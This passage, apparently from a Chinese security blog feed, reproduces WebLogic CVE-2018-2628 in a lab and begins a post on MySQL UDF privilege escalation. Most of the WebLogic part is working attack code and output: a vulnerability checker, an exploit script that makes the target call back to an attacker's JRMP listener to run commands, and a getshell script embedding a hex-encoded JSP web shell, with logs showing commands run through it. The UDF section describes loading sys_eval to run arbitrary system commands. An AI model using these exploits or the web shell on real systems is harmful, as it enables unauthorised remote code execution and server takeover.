p&#x3D;re.findall(VER_SIG[index], res, re.S)</span><br><span class="line">    if len(p)&gt;0:</span><br><span class="line">        #print &#39;%s:%d is vul %s&#39;%(server_addr[0],server_addr[1],VUL[index])</span><br><span class="line">        return True</span><br><span class="line">    return False </span><br><span class="line">def do_run(dip,dport,index):</span><br><span class="line">    sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span><br><span class="line">    sock.settimeout(25)</span><br><span class="line">    server_addr &#x3D; (dip, dport)</span><br><span class="line">    t3handshake(sock, server_addr)</span><br><span class="line">    buildT3RequestObject(sock, dport)</span><br><span class="line">    rs&#x3D;sendEvilObjData(sock, PAYLOAD[index])</span><br><span class="line">    #print &#39;rs&#39;,rs</span><br><span class="line">    return checkVul(rs, server_addr, index)</span><br><span class="line">def run(url, port):</span><br><span class="line">    try:</span><br><span class="line">        res &#x3D; do_run(url, port, 0)</span><br><span class="line">        if res:</span><br><span class="line">            out &#x3D; &#123;</span><br><span class="line">            &#39;结果&#39;: &#39;存在WebLogic CVE-2018-2628 反序列化RCE漏洞&#39;,</span><br><span class="line">            &#39;url&#39;: &#39;%s:%s&#39; % (url, port),</span><br><span class="line">            &#125; </span><br><span class="line">            return json.dumps(out, encoding&#x3D;&#39;utf8&#39;, ensure_ascii &#x3D; False)</span><br><span class="line">        return False</span><br><span class="line">    except Exception ,e:</span><br><span class="line">        print &quot;[!] &quot;, e</span><br><span class="line">    return False</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    dip &#x3D; sys.argv[1]</span><br><span class="line">    dport &#x3D; 7001</span><br><span class="line">    print run(dip,dport)</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# python weblogic_poc.py 192.168.220.141</span><br><span class="line">&#123;&quot;url&quot;: &quot;192.168.220.141:7001&quot;, &quot;结果&quot;: &quot;存在WebLogic CVE-2018-2628 反序列化RCE漏洞&quot;&#125;</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据前面探测的信息，发现目标存在Java反序列化漏洞</p>
<p>我们需要使用“ysoserial”这个工具: <a href="https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar" target="_blank" rel="noopener">https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</a></p>
<p>首先使用ysoserial在攻击机上启动一个JRMP server，输入一下命令</p>
<p> <code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</code></p>
<p><code>[listen port]: 攻击机要监听的端口 [command]: 想要执行的命令</code></p>
<p><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7089 CommonsCollections1 &quot;touch /tmp/test.bat&quot;</code></p>
<p>使用python脚本向目标发送数据包，该脚本会让靶机调用相关服务来访问我们启动的JRMP server，执行我们想要的命令</p>
<p>脚本：(基于python2)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import print_function</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</span><br><span class="line">    #generates ysoserial payload</span><br><span class="line">    command &#x3D; &#39;java -jar &#123;&#125; &#123;&#125; &#123;&#125;:&#123;&#125; &gt; payload.out&#39;.format(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)</span><br><span class="line">    print(&quot;command: &quot; + command)</span><br><span class="line">    os.system(command)</span><br><span class="line">    bin_file &#x3D; open(&#39;payload.out&#39;,&#39;rb&#39;).read()</span><br><span class="line">    return binascii.hexlify(bin_file)</span><br><span class="line">def t3_handshake(sock, server_addr):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    sock.recv(1024)</span><br><span class="line">    print(&#39;handshake successful&#39;)</span><br><span class="line">def build_t3_request_object(sock, port):</span><br><span class="line">    data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span><br><span class="line">    data2 &#x3D; &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;.format(&#39;&#123;:04x&#125;&#39;.format(dport))</span><br><span class="line">    data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span><br><span class="line">    data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span><br><span class="line">    for d in [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048))))</span><br><span class="line">def send_payload_objdata(sock, data):  payload&#x3D;&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39;</span><br><span class="line">    payload+&#x3D;data</span><br><span class="line">    payload+&#x3D;&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39;</span><br><span class="line">    payload &#x3D; &#39;%s%s&#39;%(&#39;&#123;:08x&#125;&#39;.format(len(payload)&#x2F;2 + 4),payload)</span><br><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span><br><span class="line">    res &#x3D; &#39;&#39;</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            res +&#x3D; sock.recv(4096)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line">    return res</span><br><span class="line">def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</span><br><span class="line">    sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(65)</span><br><span class="line">    server_addr &#x3D; (dip, dport)</span><br><span class="line">    t3_handshake(sock, server_addr)</span><br><span class="line">    build_t3_request_object(sock, dport)</span><br><span class="line">    payload &#x3D; generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">    print(&quot;payload: &quot; + payload)</span><br><span class="line">    rs&#x3D;send_payload_objdata(sock, payload)</span><br><span class="line">    print(&#39;response: &#39; + rs)</span><br><span class="line">    print(&#39;exploit completed!&#39;)</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    #check for args, print usage if incorrect</span><br><span class="line">    if len(sys.argv) !&#x3D; 7:</span><br><span class="line">        print(&#39;\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] &#39;</span><br><span class="line">              &#39;[JRMPListener ip] [JRMPListener port] [JRMPClient]\n&#39;)</span><br><span class="line">        sys.exit()</span><br><span class="line">    dip &#x3D; sys.argv[1]</span><br><span class="line">    dport &#x3D; int(sys.argv[2])</span><br><span class="line">    path_ysoserial &#x3D; sys.argv[3]</span><br><span class="line">    jrmp_listener_ip &#x3D; sys.argv[4]</span><br><span class="line">    jrmp_listener_port &#x3D; sys.argv[5]</span><br><span class="line">    jrmp_client &#x3D; sys.argv[6]</span><br><span class="line">    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 44553.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span><br><span class="line">[victim ip]：目标weblogic的IP</span><br><span class="line">[victim port]：目标weblogic的端口</span><br><span class="line">[path to ysoserial] ：ysoserial的路径</span><br><span class="line">[JRMPListener ip] ：第一步中启动JRMP Server的IP地址</span><br><span class="line"> [JRMPListener port] ：第一步中启动JRMP Server的I端口地址</span><br><span class="line">[JRMPClient]：执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2</span><br></pre></td></tr></table></figure>

<p>等待一小会时间，双方会进行握手，进行数据交互，然后成功执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 44553.py 192.168.220.141 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.31.223 7089 JRMPClient</span><br><span class="line">handshake successful</span><br><span class="line">send request payload successful,recv length:1691</span><br><span class="line">command: java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar JRMPClient 192.168.31.223:7089 &gt; payload.out</span><br><span class="line">payload: aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3139322e3136382e33312e32323300001bb1000000007f55ff7000000000000000000000000000000078</span><br></pre></td></tr></table></figure>
</li>
<li><p>进入环境中，查看是否执行成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps -a   #查看要进入容器的id</span><br><span class="line">docker exec -ti 容器id或容器名称 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><img src="/posts/37247/1.jpg" alt="执行成功"></p>
</li>
</ol>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>来自github上的一个python脚本，可以使用该方法执行一些命令</p>
<p>地址：<a href="https://github.com/jas502n/CVE-2018-2628" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2018-2628</a></p>
<ol>
<li><p>执行脚本：(基于python2)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">dip &#x3D; str(sys.argv[1])</span><br><span class="line">dport &#x3D; int(sys.argv[2])</span><br><span class="line">VUL&#x3D;[&#39;CVE-2018-2628&#39;]</span><br><span class="line">#remote ip changed to :127.0.0.1</span><br><span class="line">PAYLOAD&#xspan><br><span class="line">#remote ip:104.251.228.50</span><br><span class="line">#PAYLOAD&#x3D;[&#39;aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078&#39;]</span><br><span class="line">VER_SIG&#x3D;[&#39;\\$Proxy[0-9]+&#39;]</span><br><span class="line"># 0x01 获取weblogic版本</span><br><span class="line">def t3handshake(sock,server_addr):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    sock.recv(1024)</span><br><span class="line">    print &#39;handshake successful&#39;</span><br><span class="line"># 0x02</span><br><span class="line">def buildT3RequestObject(sock,port):</span><br><span class="line">    data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span><br><span class="line">    data2 &#x3D; &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;.format(&#39;&#123;:04x&#125;&#39;.format(dport))</span><br><span class="line">    data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span><br><span class="line">    data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span><br><span class="line">    for d in [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048)))</span><br><span class="line">#0x03 getshell</span><br><span class="line">def sendGetShell(sock,data):   </span><br><span class="line">    s1 &#x3D; &quot;00000767056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d4&quot;</span><br><span class="line">    shell_file &#x3D; &quot;3c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d&quot;</span><br><span class="line">    filename &#x3D; (str(sys.argv[3])).encode(&quot;hex&quot;)</span><br><span class="line">    #print &quot;\n&gt;&gt;&gt;shell filename: %s &gt;&gt;16-hex %s&quot; % (str(sys.argv[3]),filename)</span><br><span class="line">    #print &quot;\n\n&quot;</span><br><span class="line">    s3 &#x3D; &quot;0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c%sc0807702005c7878fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&quot; % (filename)</span><br><span class="line">    payload1 &#x3D; s1 + shell_file + s3</span><br><span class="line">    #print &quot;GetShell Payload: %s&quot; % payload1</span><br><span class="line">    #print &quot;\n\n&quot;</span><br><span class="line">    print &quot;\n\n &gt;&gt;&gt;&gt;usage: python cve-2018-2628.py ip port shell1.jsp \n\n&quot;</span><br><span class="line">    print &quot;\n&gt;&gt;&gt;Shell File Upload Dir: \n\n&quot;, r&quot;servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\%s&quot; % (str(sys.argv[3]))</span><br><span class="line">    print </span><br><span class="line">    for i in [payload1]:</span><br><span class="line">        sock.send(i.decode(&quot;hex&quot;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + dip + &quot;:&quot; + str(dport)</span><br><span class="line">    print &quot;\n&gt;&gt;&gt;Getshell: %s&#x2F;bea_wls_internal&#x2F;%s?tom&#x3D;d2hvYW1pCg&#x3D;&#x3D;&quot; % (url, (str(sys.argv[3])))</span><br><span class="line">def run(dip,dport,index):</span><br><span class="line">    sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span><br><span class="line">    sock.settimeout(20)</span><br><span class="line">    server_addr &#x3D; (dip, dport)</span><br><span class="line">    t3handshake(sock,server_addr)</span><br><span class="line">    #buildT3RequestObject(sock,dport)</span><br><span class="line">    rs&#x3D;sendGetShell(sock,PAYLOAD[index])</span><br><span class="line">    #print &#39;rs&#39;,rs</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    run(dip,dport,0)</span><br></pre></td></tr></table></figure>
<p>执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python CVE-2018-2628-Getshell.py 目标地址 目标端口 test11.jsp</span><br><span class="line">(注意: 上面test11.jsp为你起的文件名，改名字需要长度等于10)</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# python CVE-2018-2628-Getshell.py 192.168.220.141 7001 test11.jsp</span><br><span class="line">handshake successful</span><br><span class="line"> &gt;&gt;&gt;&gt;usage: python cve-2018-2628.py ip port shell1.jsp </span><br><span class="line">&gt;&gt;&gt;Shell File Upload Dir: </span><br><span class="line">servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\test11.jsp</span><br><span class="line">&gt;&gt;&gt;Getshell: http:&#x2F;&#x2F;192.168.220.141:7001&#x2F;bea_wls_internal&#x2F;test11.jsp?tom&#x3D;d2hvYW1pCg&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;桌面#</span><br></pre></td></tr></table></figure></li>
<li><p>现在我们已经获取了一个地址，打开浏览器访问它：</p>
<p><img src="/posts/37247/2.png" alt="whoami"></p>
</li>
<li><p>我们执行了whoami的命令。上面 tom 后面的变量即为 whomai 的base64编码，我们可以使用 kali 来生成任意base64编码，来替换该变量，以达到执行任意命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# echo &quot;uname -a&quot; | base64</span><br><span class="line">dW5hbWUgLWEK</span><br></pre></td></tr></table></figure>

<p><img src="/posts/37247/3.png" alt="uname -a"></p>
</li>
<li><p>不难发现，上面的test11变为了test12，是因为在进行多次测试的时候发现，生成完一次脚本的连接仅能访问一次，第二次访问会返回404…</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然上面的复现都执行成功了，但是我还是不太理解，脚本还不明白，以后要继续看，最好是能够自己学习写脚本。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL提权的几种姿势</title>
    <url>/posts/60533.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习提权，什么都不懂，只能跟着学长们走一遍吧！！！</p>
<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>待补充。。。。。。。。。。</p>
<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a><strong>环境</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本机os： win10</span><br><span class="line">靶机os： win7</span><br><span class="line">php： 5.4.45</span><br><span class="line">mysql： 5.5.53</span><br></pre></td></tr></table></figure>

<h3 id="udf是什么"><a href="#udf是什么" class="headerlink" title="udf是什么"></a>udf是什么</h3><p>udf：”user defined function”，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，性质就象使用本地MySQL函数如abs()或concat()。udf在mysql5.1以后的版本中，存在于”mysql/lib/plugin”目录下，文件后缀为”.dll”，常用c语言编写。</p>
<h3 id="如何使用udf"><a href="#如何使用udf" class="headerlink" title="如何使用udf"></a>如何使用udf</h3><p>假设我的udf文件名为‘udf.dll’，存放在Mysql根目录(通过select @@basedir可知)的‘lib/plugin’目录下。在udf中，我定义了名为sys_eval的mysql函数，可以执行系统任意命令。如果我现在就打开mysql命令行，使用select sys_eval(‘dir’);的话，系统会返回sys_eval()函数未定义。因为我们仅仅是把‘udf.dll’放到了某个文件夹里，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。</p>
<p>所以，我们应该把‘udf.dll’中的自定义函数引入进来。</p>
<p>实例用法：</p>
<p><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.dll&#39;;</code></p>
<p>只有两个变量，一个是function_name(函数名)，这里用的是sys_eval；还有一个变量是shared_library_name(共享包名称)，即udf.dll。</p>
<p>这个函数用于执行系统命令，用法如下：</p>
<p><code>select sys_eval(&#39;cmd command&#39;);</code></p>
<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a><strong>利用前提</strong></h3><ul>
